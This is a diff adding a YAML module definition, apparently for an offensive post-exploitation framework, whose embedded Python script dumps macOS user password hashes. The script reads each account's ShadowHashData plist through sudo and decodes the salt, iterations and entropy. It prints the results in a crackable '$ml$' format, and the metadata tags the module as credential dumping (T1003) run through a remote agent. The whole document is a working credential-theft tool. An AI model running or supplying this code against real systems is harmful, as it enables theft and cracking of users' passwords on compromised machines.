@@ -1,0 +1,59 @@
+name: Hashdump
+authors:
+  - '@harmj0y'
+description: Extracts found user hashes out of /var/db/dslocal/nodes/Default/users/*.plist
+software: ''
+techniques:
+  - T1003
+background: false
+output_extension: ''
+needs_admin: true
+opsec_safe: true
+language: python
+min_language_version: '2.6'
+comments:
+  - http://apple.stackexchange.com/questions/186893/os-x-10-9-where-are-password-hashes-stored
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+script: |
+  import os
+  import base64
+  def getUserHash(userName):
+      from xml.etree import ElementTree
+      try:
+          raw = os.popen('sudo defaults read /var/db/dslocal/nodes/Default/users/%s.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - 2> /dev/null' %(userName)).read()
+
+          if len(raw) > 100:
+
+              root = ElementTree.fromstring(raw)
+              children = root[0][1].getchildren()
+
+              entropy64 = ''.join(children[1].text.split())
+              iterations = children[3].text
+              salt64 = ''.join(children[5].text.split())
+
+              entropyRaw = base64.b64decode(entropy64)
+              entropyHex = entropyRaw.encode("hex")
+
+              saltRaw = base64.b64decode(salt64)
+              saltHex = saltRaw.encode("hex")
+
+              return (userName, "$ml$%s$%s$%s" %(iterations, saltHex, entropyHex))
+
+      except Exception as e:
+          print("getUserHash() exception: %s" %(e))
+          pass
+
+
+  userNames = [ plist.split(".")[0] for plist in os.listdir('/var/db/dslocal/nodes/Default/users/') if not plist.startswith('_')]
+
+  userHashes = []
+  for userName in userNames:
+      userHash = getUserHash(userName)
+      if(userHash):
+          userHashes.append(getUserHash(userName))
+
+  print(userHashes)
